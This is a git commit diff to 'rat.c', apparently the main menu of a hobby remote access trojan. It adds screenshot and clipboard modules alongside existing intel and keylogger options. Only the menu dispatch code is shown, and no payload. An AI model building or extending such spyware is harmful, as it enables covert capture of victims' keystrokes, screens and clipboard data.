c92b4a6cd3368e5eaa32217d37dbd8b16a52c976
Franco <47805847+francobel@users.noreply.github.com>
2021-07-29 21:12:25 -0700

    Add files via upload

--- rat.c
+++ rat.c
@@ -1,14 +1,16 @@
 #include "intel.h"
 #include "keylogger.h"
 #include "list.h"
+#include "screenshot.h"
+#include "clipboard.h"
 
 int _tmain()
 {
 	while (1)
 	{
-		_tprintf(_T("MENU:\n 1. Intel\n 2. Keylogger\n 3. List\n 4. Quit\n\n"));
+		_tprintf(_T("MENU:\n 1. Intel\n 2. Keylogger\n 3. List\n 4. Clipboard\n 5. Quit\n\n"));
 
-		TCHAR input[10];
+		TCHAR input[2];
 		_tprintf(_T("User input: "));
 		_getts_s(input, 2);
 		_tprintf(_T("\n"));
@@ -28,6 +30,10 @@ int _tmain()
 			list();
 		}
 		else if (!strcmp(input, "4"))
+		{
+			clipboard();
+		}
+		else
 		{
 			exit(0);
 		}
